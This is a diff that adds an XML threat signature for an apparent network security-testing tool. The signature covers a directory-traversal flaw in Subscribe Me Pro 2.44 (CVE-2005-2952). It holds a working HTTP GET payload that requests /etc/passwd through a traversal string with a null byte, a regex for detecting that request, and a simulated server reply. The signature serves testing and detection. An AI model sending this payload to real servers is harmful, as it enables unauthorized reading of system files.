@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Subscribe Me Pro Directory Traversal"/>
+    <EngDesc display="true" value="This threat sends a request for the file /etc/passwd through an unsanitized parameter to a web application.  This web application will display the contents of the file to the attacker, allowing for further exploitation.  Subscribe Me is a web application and typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+      <item value="Scoping"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Subscribe_Me_Pro"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Subscribe_Me_Pro_Subscribe_Me_Pro"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Subscribe_Me_Pro_Subscribe_Me_Pro_2.44"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.h4cky0u.org/advisories/HYA-2005-007-subscribe-me-pro.txt"/>
+    <CVEID display="true" value="CVE-2005-2952"/>
+    <bugtraqID display="true" value="14817"/>
+    <OSVDB display="true" value="19380"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010657f7b3ca00c000a80001003c2b604e1b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742243285156250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="HTTP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="[Gg][Ee][Tt]\X [/][Ss][.][Pp][Ll][?][Ee][=][1][&amp;][Ss][Uu][Bb][Ss][Cc][Rr][Ii][Bb][Ee][=][Ss][Uu][Bb][Ss][Cc][Rr][Ii][Bb][Ee][&amp;][Ll][=][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][.][.][/][Ee][Tt][Cc][/][Pp][Aa][Ss][Ss][Ww][Dd][%][0][0][&amp;][Ss][Uu][Bb][Mm][Ii][Tt][=][%][2][0][%][2][0][Ss][Uu][Bb][Mm][Ii][Tt][%][2][0][%][2][0]\X [Hh][Tt][Tt][Pp][/][1][.][0]\X&#13;&#10;\X&#13;&#10;"/>
+    <Created value="1139462486" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <HTTP Method="GET" Request-URI="/s.pl?e=1&amp;subscribe=subscribe&amp;l=../../../../../../../../../../../../etc/passwd%00&amp;SUBMIT=%20%20Submit%20%20" HTTP-Version="HTTP/1.0"/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
